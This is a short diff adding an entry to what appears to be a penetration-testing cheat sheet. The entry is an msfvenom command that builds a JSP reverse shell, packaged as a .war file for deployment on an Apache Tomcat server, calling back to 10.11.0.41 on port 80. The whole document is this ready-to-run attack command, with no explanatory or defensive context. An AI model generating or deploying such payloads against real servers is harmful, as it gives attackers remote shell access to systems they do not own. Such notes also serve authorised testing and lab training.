@@ -1,0 +1,2 @@
+### Generate jsp reverse shell in .war format for exploiting Apache tomcat server
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=80 -f war -o revshell.war
